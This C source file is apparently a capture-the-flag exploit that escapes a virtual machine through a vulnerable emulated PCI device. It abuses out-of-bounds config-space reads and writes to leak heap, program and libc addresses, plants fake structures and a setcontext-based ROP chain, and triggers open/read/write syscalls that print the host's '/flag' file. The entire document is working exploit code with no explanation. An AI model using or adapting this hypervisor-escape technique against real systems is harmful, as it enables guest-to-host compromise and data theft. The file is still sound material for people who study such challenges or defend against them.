#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

char buffer[0x400];
void hexdump(){
	for (int i = 0; i < 0x40; i++){
		for (int j = 0; j < 0x10; j++){
			printf("%02x ", buffer[i*0x10+j] & 0xff);
		}
		puts("");
	}
}

int main() {
	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/config", O_RDWR|O_SYNC);
	unsigned long offset_read(int ofs) {
		unsigned int offset = (unsigned int) ofs;
		unsigned int tmp0;
		unsigned int tmp1;
		unsigned long ret = 0;
		
		pwrite(fd, &offset, 4, 0xe0);
		pread(fd, &tmp0, 4, 0xe4);

		offset++;

		pwrite(fd, &offset, 4, 0xe0);
		pread(fd, &tmp1, 4, 0xe4);
		
		ret |= (tmp1 * 0x100000000);
		ret |= tmp0;
		return ret;
	}
	unsigned long offset_write(int ofs, unsigned long value) {
		unsigned int offset = (unsigned int) ofs;
		unsigned int tmp0 = value & 0xffffffff;
		unsigned int tmp1 = value >> 32; 
		
		pwrite(fd, &offset, 4, 0xe0);
		pwrite(fd, &tmp0, 4, 0xe4);

		offset++;

		pwrite(fd, &offset, 4, 0xe0);
		pwrite(fd, &tmp1, 4, 0xe4);
	}


	unsigned long heap_leak = offset_read(-2);
	unsigned long pci_dev = heap_leak;
	printf("pci_dev --> %lx\n", pci_dev);

	unsigned long pie_leak = offset_read(-358);
	unsigned long pie_base = pie_leak - 0x426760;
	unsigned long value_gfree = offset_read(-(0xae0)/4);
	unsigned long libc_base = value_gfree - 0x2500b0;
	unsigned long setcontext = libc_base + 0x4278d;
	unsigned long rdi = libc_base + 0x0010a9b5;
	unsigned long rsi = libc_base + 0x001160b1;
	unsigned long rdx = pie_base + 0x006c0962;
	unsigned long rax = libc_base + 0x000d2cb7;
	unsigned long syscall = libc_base + 0x00128dbb;
	unsigned long mov_rdi_rax = libc_base + 0x0012a619;

	//0x001641e7: mov rax, [rdi+8]; call qword ptr [rax+0x48];
	unsigned long gadget1 = libc_base + 0x001641e7;
	//0x0016033e: mov rdx, [rax+0x38]; mov rdi, rax; call qword ptr [rdx+0x20];
	unsigned long gadget2 = libc_base + 0x0016033e;
	
	printf("pie_base --> %lx\n", pie_base);
	printf("libc_base --> %lx\n", libc_base);

	printf("setcontext --> %lx\n", setcontext);

	offset_write((-0xae8+0x100)/4, 0x67616c662f);

	offset_write((-0xae8+8)/4, pci_dev);
	offset_write((-0xae8+0x48)/4, gadget2);
	offset_write((-0xae8+0x38)/4, pci_dev);
	offset_write((-0xae8+0x20)/4, setcontext);

	offset_write((-0xae8+0xa0)/4, pci_dev-0x100+8);
	offset_write((-0xae8+0xa8)/4, rdi);

	offset_write((-0xae8-0x100+0x08)/4, pci_dev+0x100);
	offset_write((-0xae8-0x100+0x10)/4, rsi);
	offset_write((-0xae8-0x100+0x18)/4, 0);
	offset_write((-0xae8-0x100+0x20)/4, rdx);
	offset_write((-0xae8-0x100+0x28)/4, 0);
	offset_write((-0xae8-0x100+0x30)/4, rax);
	offset_write((-0xae8-0x100+0x38)/4, 2);
	offset_write((-0xae8-0x100+0x40)/4, syscall);

	offset_write((-0xae8-0x100+0x48)/4, rdi);
	offset_write((-0xae8-0x100+0x50)/4, pci_dev-0x100+0x10+0x58);
	offset_write((-0xae8-0x100+0x58)/4, mov_rdi_rax);

	offset_write((-0xae8-0x100+0x08+0x58)/4, rdi);
	//offset_write((-0xae8-0x100+0x10+0x58)/4, 0xf);
	offset_write((-0xae8-0x100+0x18+0x58)/4, rsi);
	offset_write((-0xae8-0x100+0x20+0x58)/4, pci_dev+0x100);
	offset_write((-0xae8-0x100+0x28+0x58)/4, rdx);
	offset_write((-0xae8-0x100+0x30+0x58)/4, 0x100);
	offset_write((-0xae8-0x100+0x38+0x58)/4, rax);
	offset_write((-0xae8-0x100+0x40+0x58)/4, 0);
	offset_write((-0xae8-0x100+0x48+0x58)/4, syscall);

	offset_write((-0xae8-0x100+0x08+0x58+0x48)/4, rdi);
	offset_write((-0xae8-0x100+0x10+0x58+0x48)/4, 1);
	offset_write((-0xae8-0x100+0x18+0x58+0x48)/4, rsi);
	offset_write((-0xae8-0x100+0x20+0x58+0x48)/4, pci_dev+0x100);
	offset_write((-0xae8-0x100+0x28+0x58+0x48)/4, rdx);
	offset_write((-0xae8-0x100+0x30+0x58+0x48)/4, 0x100);
	offset_write((-0xae8-0x100+0x38+0x58+0x48)/4, rax);
	offset_write((-0xae8-0x100+0x40+0x58+0x48)/4, 1);
	offset_write((-0xae8-0x100+0x48+0x58+0x48)/4, syscall);

	offset_write((-0xae8+0x500)/4, gadget1);
	pread(fd, (void *)1, 0x12340, 0xe0);
}
